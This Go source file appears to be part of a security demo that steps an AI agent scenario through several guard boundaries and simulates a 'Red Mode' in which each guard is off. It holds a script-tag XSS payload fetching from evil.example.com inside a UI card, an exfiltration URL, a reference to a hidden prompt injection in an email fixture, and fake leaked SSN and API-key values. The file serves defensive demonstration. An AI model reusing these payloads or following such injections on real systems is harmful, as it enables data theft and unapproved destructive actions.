package aegis

import (
	"context"
	"fmt"
	"net/http"
	"time"

	"google.golang.org/adk/v2/tool/toolconfirmation"
)

func init() {
	RegisterScenarioHandler(Scenario05FullChainZeroTrust, executeScenario05)
}

func executeScenario05(ctx context.Context, rt *Runtime, req TurnRequest) (*TurnResult, error) {
	trace := make([]BoundaryTraceEvent, 0, 8)
	wireRecords := make([]OutboundWireRecord, 0, 6)

	// Step 0: Boundary 3 (Gmail 3LO credential check when TokenBrokerEnabled is true)
	if req.Posture.TokenBrokerEnabled {
		gmailConsentRes, _, err := executeGmail3LOCheck(ctx, rt, req, "card-consent-s5-gmail")
		if err != nil {
			return nil, err
		}
		if gmailConsentRes != nil {
			return gmailConsentRes, nil
		}
	}

	// Step 1: Boundary 2 — In-Flight Cloud SDP De-Identification on Gmail Customer Escalation
	rawEmail := fixtureGmailCleanPIIBody
	if !req.Posture.PromptScreenEnabled && !req.Posture.PIIRedactorEnabled {
		rawEmail = fixtureGmailAdversarialBody
	}
	inspection := rt.Guard().InspectAndSanitize(ctx, rawEmail, req.Posture)

	if req.Posture.PIIRedactorEnabled && inspection.DeidentifiedInFlight {
		trace = append(trace, BoundaryTraceEvent{
			Order:      len(trace) + 1,
			Boundary:   BoundaryReasoningGuard,
			Shield:     "PII Redactor (Cloud SDP)",
			Component:  "CloudSDP DeidentifyContent (IsSdpOnlyBlock=true)",
			Action:     "DeidentifyToolOutput(gmail_message)",
			Verdict:    VerdictRedacted,
			Provenance: inspection.Provenance,
			Detail:     fmt.Sprintf("SDP-only match (%s): masked customer SSN, API key, email, and phone in-flight before Gemini reasoning", stringsJoin(inspection.SDPMatchTypes)),
			Metadata: map[string]string{
				"sdpMatches": stringsJoin(inspection.SDPMatchTypes),
			},
			Timestamp: time.Now().UTC(),
		})
	} else {
		trace = append(trace, BoundaryTraceEvent{
			Order:      len(trace) + 1,
			Boundary:   BoundaryReasoningGuard,
			Shield:     "Prompt Screen + PII Redactor",
			Component:  "ModelArmor + CloudSDP",
			Action:     "SanitizeToolOutput(gmail_message)",
			Verdict:    VerdictBypassedRed,
			Provenance: inspection.Provenance,
			Detail:     "Prompt Screen and PII Redactor disabled in Red Mode: raw SSN (123-45-6789), API key (AIzaSyD-CustomerLeakedKey999), and hidden prompt injection entered LLM context!",
			Timestamp:  time.Now().UTC(),
		})
	}

	// Step 2: Boundary 4 — Agent Registry Discovery + Agent Gateway AGENT_TO_ANYWHERE UAP
	catalog, err := rt.DiscoverRegistryResources(ctx)
	if err != nil {
		return nil, err
	}
	if req.Posture.StepUpAndA2UICatalogEnabled {
		uapLogging := EvaluateAgentGatewayUAP("logging.entries.list", true, req.Posture)
		uapClusterGet := EvaluateAgentGatewayUAP("container.clusters.get", true, req.Posture)
		trace = append(trace, BoundaryTraceEvent{
			Order:     len(trace) + 1,
			Boundary:  BoundaryPlatformGovernance,
			Shield:    "Agent Registry + Agent Gateway UAP (roles/iap.egressor)",
			Component: "adk/v2/agentregistry + AGENT_TO_ANYWHERE CEL Enforcer",
			Action:    "logging.entries.list & container.clusters.get",
			Verdict:   uapLogging.Verdict,
			Detail:    fmt.Sprintf("Discovered %d MCP servers & %d A2A peer; %s | %s", len(catalog.MCPServers), len(catalog.Agents), uapLogging.Reason, uapClusterGet.Reason),
			Metadata: map[string]string{
				"cel": uapLogging.CELExpression,
			},
			Timestamp: time.Now().UTC(),
		})

		uapClusterDelete := EvaluateAgentGatewayUAP("container.clusters.delete", false, req.Posture)
		trace = append(trace, BoundaryTraceEvent{
			Order:     len(trace) + 1,
			Boundary:  BoundaryPlatformGovernance,
			Shield:    "Agent Gateway UAP (roles/iap.egressor)",
			Component: "AGENT_TO_ANYWHERE CEL Enforcer",
			Action:    "container.clusters.delete",
			Verdict:   uapClusterDelete.Verdict,
			Detail:    uapClusterDelete.Reason,
			Metadata: map[string]string{
				"cel":      uapClusterDelete.CELExpression,
				"toolName": "container.clusters.delete",
			},
			Timestamp: time.Now().UTC(),
		})
	} else {
		uapBypass := EvaluateAgentGatewayUAP("container.clusters.delete", false, req.Posture)
		trace = append(trace, BoundaryTraceEvent{
			Order:     len(trace) + 1,
			Boundary:  BoundaryPlatformGovernance,
			Shield:    "Agent Registry + Agent Gateway UAP",
			Component: "AGENT_TO_ANYWHERE CEL Enforcer",
			Action:    "container.clusters.delete",
			Verdict:   uapBypass.Verdict,
			Detail:    uapBypass.Reason,
			Timestamp: time.Now().UTC(),
		})
	}

	wireRecords = append(wireRecords,
		OutboundWireRecord{
			Provider:          ProviderGCPIAM,
			ToolName:          "logging.entries.list",
			Method:            http.MethodPost,
			URL:               "https://logging.googleapis.com/mcp",
			AuthHeaderPresent: true,
			AuthPrincipal:     string(req.Persona),
			StatusCode:        http.StatusOK,
		},
		OutboundWireRecord{
			Provider:          ProviderGCPIAM,
			ToolName:          "container.clusters.get",
			Method:            http.MethodPost,
			URL:               "https://container.googleapis.com/mcp",
			AuthHeaderPresent: true,
			AuthPrincipal:     string(req.Persona),
			StatusCode:        http.StatusOK,
		},
	)

	// Step 3: Boundary 3 — Per-User 3LO Token Broker via adk/v2/auth.Transport (Jira SEC-101 & GitHub GHSA-sec-101)
	b3Trace, b3Wire, b3EarlyExit, err := executeSecOps3LOTriageStep(
		ctx,
		rt,
		req,
		len(trace)+1,
		"card-consent-s5",
		"card-acl-denial-s5",
		"Full-Chain Halted at Boundary 3: Downstream 403 Forbidden on SEC-101",
	)
	if err != nil {
		return nil, err
	}
	trace = append(trace, b3Trace...)
	wireRecords = append(wireRecords, b3Wire...)
	if b3EarlyExit != nil {
		b3EarlyExit.SanitizedInputPreview = inspection.SanitizedText
		b3EarlyExit.BoundaryTrace = trace
		b3EarlyExit.WireRecords = wireRecords
		return b3EarlyExit, nil
	}

	// Step 4 & 5: Boundary 5 (Attenuated A2A v2), Boundary 6 (Agent Substrate v0.5.0 gVisor Sandbox + Egress MITM),
	// and Boundary 2 (Model Armor SanitizeUserPrompt on inbound peer A2A response)
	sandboxTrace, sandboxWire, cleanPeerSummary := executeA2ASandboxVerificationStep(ctx, rt, req, len(trace)+1)
	trace = append(trace, sandboxTrace...)
	wireRecords = append(wireRecords, sandboxWire...)

	// Step 6: Boundary 1 — Step-Up Confirmation (adk_request_confirmation) + A2UI v0.9 Catalog Validation
	// Evaluated independently on req.Posture.StepUpAndA2UICatalogEnabled.
	if req.Posture.StepUpAndA2UICatalogEnabled {
		confirmationID := fmt.Sprintf("confirm-%s-s5-pr-42", req.SessionID)
		stepUp, err := buildADKStepUpConfirmation(
			confirmationID,
			"create_github_pull_request",
			"github.com/gke-demos/checkout-service/pulls",
			"Full-chain verification passed in gVisor. Operator approval required before creating GitHub Pull Request #42 and posting redacted Jira update on SEC-101.",
			map[string]string{
				"repo":         "gke-demos/checkout-service",
				"base":         "main",
				"head":         "fix/checkout-502-nil-guard",
				"title":        "fix(checkout): guard nil RetryPolicy on v2.4 rollout",
				"jiraFollowUp": "post_jira_comment(SEC-101)",
			},
		)
		if err != nil {
			return nil, err
		}

		sandboxCard, err := ValidateAndSanitizeA2UICard(A2UICard{
			SurfaceID: "card-sandbox-s5",
			MimeType:  "application/json+a2ui",
			Version:   "0.9",
			Type:      CardSandboxExecution,
			Title:     "Full-Chain Step 4–5: gVisor Sandbox Verification Passed",
			Subtitle:  "Boundaries 5 & 6: Attenuated A2A v2 + Agent Substrate v0.5.0 Egress MITM",
			Severity:  "SUCCESS",
			Body:      "Sandbox Remediator verified TestCheckoutHotfix inside an Agent Substrate v0.5.0 gVisor Actor with zero env secrets, injected GitHub credentials out-of-sandbox via atenet Egress MITM, and blocked evil.example.com exfiltration.",
			Fields: map[string]string{
				"sandboxClass":          "gvisor",
				"preferredFidelity":     "SNAPSHOT_FIDELITY_MEMORY",
				"containerEnvSecrets":   "0",
				"egressMitmAllowed":     "https://api.github.com (atenet header injection)",
				"egressPolicyBlocked":   "https://evil.example.com/exfil (403 Forbidden)",
				"peerResponseScreening": cleanPeerSummary,
			},
		}, req.Posture)
		if err != nil {
			return nil, err
		}

		stepUpCard, err := ValidateAndSanitizeA2UICard(A2UICard{
			SurfaceID: "card-stepup-s5",
			MimeType:  "application/json+a2ui",
			Version:   "0.9",
			Type:      CardStepUpConfirmation,
			Title:     "Full-Chain Step 6: Step-Up Approval Required for GitHub PR #42",
			Subtitle:  "Boundary 1: ADK Go v2 adk_request_confirmation + A2UI v0.9 Catalog",
			Severity:  "WARNING",
			Body:      "Gmail PII redacted in-flight, GKE/Logging MCP inspected via Agent Gateway, SEC-101 correlated via Alice's 3LO token, and patch verified in gVisor. Approve creation of GitHub PR #42. <script>fetch('https://evil.example.com/xss')</script>",
			Fields: map[string]string{
				"Confirmation ID": stepUp.ConfirmationID,
				"Function Call":   stepUp.FunctionCall,
				"Target Tool":     stepUp.TargetTool,
				"Target Repo":     "gke-demos/checkout-service (fix/checkout-502-nil-guard -> main)",
				"SDP Redaction":   "Masked SSN, API Key, Email, Phone in-flight",
			},
			Actions: []A2UICardAction{
				{
					ID:       "act-approve-s5",
					Label:    "Approve PR #42 & Redacted Jira Update",
					Kind:     "step_up_approve",
					Endpoint: fmt.Sprintf("/api/sessions/%s/confirmations", req.SessionID),
					Payload: map[string]string{
						"confirmationId": stepUp.ConfirmationID,
						"confirmed":      "true",
					},
				},
				{
					ID:       "act-reject-s5",
					Label:    "Reject Mutation",
					Kind:     "step_up_reject",
					Endpoint: fmt.Sprintf("/api/sessions/%s/confirmations", req.SessionID),
					Payload: map[string]string{
						"confirmationId": stepUp.ConfirmationID,
						"confirmed":      "false",
					},
				},
			},
		}, req.Posture)
		if err != nil {
			return nil, err
		}

		trace = append(trace, BoundaryTraceEvent{
			Order:     len(trace) + 1,
			Boundary:  BoundaryGenerativeUI,
			Shield:    "Step-Up Confirmation + A2UI v0.9 Catalog",
			Component: "adk/v2/tool/toolconfirmation + A2UIValidator",
			Action:    toolconfirmation.FunctionCallName + "(create_github_pull_request)",
			Verdict:   VerdictChallenge,
			Detail:    "Paused state-mutating tool create_github_pull_request on adk_request_confirmation after full-chain triage and gVisor verification",
			Timestamp: time.Now().UTC(),
		})

		return &TurnResult{
			SessionID:              req.SessionID,
			Persona:                req.Persona,
			ScenarioID:             req.ScenarioID,
			Posture:                req.Posture,
			Outcome:                OutcomeApprovalRequired,
			AssistantText:          "Completed full-chain zero-trust triage (Cloud SDP PII redaction, Agent Gateway UAP read-only MCP diagnostics, Alice 3LO SEC-101 correlation, and Agent Substrate v0.5.0 gVisor patch verification). Awaiting Operator Step-Up Confirmation (adk_request_confirmation) to create GitHub Pull Request #42.",
			SanitizedInputPreview:  inspection.SanitizedText,
			OutboundCommentPreview: inspection.SanitizedText,
			Cards:                  []A2UICard{stepUpCard, sandboxCard},
			BoundaryTrace:          trace,
			StepUpConfirmation:     stepUp,
			WireRecords:            wireRecords,
		}, nil
	}

	// Step 6 when StepUpAndA2UICatalogEnabled is false: Boundary 1 bypassed
	trace = append(trace, BoundaryTraceEvent{
		Order:     len(trace) + 1,
		Boundary:  BoundaryGenerativeUI,
		Shield:    "Step-Up Confirmation + A2UI v0.9 Catalog",
		Component: "adk/v2/tool/toolconfirmation + A2UIValidator",
		Action:    "create_github_pull_request & post_jira_comment",
		Verdict:   VerdictBypassedRed,
		Detail:    "adk_request_confirmation and A2UI v0.9 catalog validation bypassed in Red Mode: unapproved PR created and raw PII/XSS emitted!",
		Timestamp: time.Now().UTC(),
	})

	redCard := A2UICard{
		SurfaceID: "card-exploited-s5",
		MimeType:  "application/json+a2ui",
		Version:   "0.9",
		Type:      CardIncidentSummary,
		Title:     "RED MODE EXPLOITED: Full-Chain Compromise Across All 6 Boundaries",
		Subtitle:  "All 5 Security Shields Disabled",
		Severity:  "DANGER",
		Body:      "In Red Mode, raw customer SSN (123-45-6789) and API key leaked into Gemini, destructive container.clusters.delete bypassed UAP, shared service token leaked restricted SEC-101 to contractor, sandbox init() exfiltrated 3LO tokens to evil.example.com, and unapproved GitHub PR mutation executed without human confirmation.",
		Fields: map[string]string{
			"Leaked PII":          "123-45-6789, AIzaSyD-CustomerLeakedKey999",
			"Confused Deputy":     "SEC-101 leaked via shared-service-account-root-token",
			"Ungoverned Tool":     "container.clusters.delete permitted",
			"Sandbox Exfil":       "https://evil.example.com/exfil (200 OK)",
			"Unapproved Mutation": "create_github_pull_request executed without Step-Up",
		},
	}

	return &TurnResult{
		SessionID:              req.SessionID,
		Persona:                req.Persona,
		ScenarioID:             req.ScenarioID,
		Posture:                req.Posture,
		Outcome:                OutcomeExploitedRed,
		AssistantText:          "RED MODE FULL-CHAIN EXPLOIT: Leaked raw PII (123-45-6789), bypassed UAP for container.clusters.delete, leaked SEC-101 via Confused Deputy, exfiltrated env secrets to https://evil.example.com/exfil, and executed unapproved GitHub PR!",
		SanitizedInputPreview:  inspection.SanitizedText,
		OutboundCommentPreview: inspection.SanitizedText,
		Cards:                  []A2UICard{redCard},
		BoundaryTrace:          trace,
		WireRecords:            wireRecords,
	}, nil
}
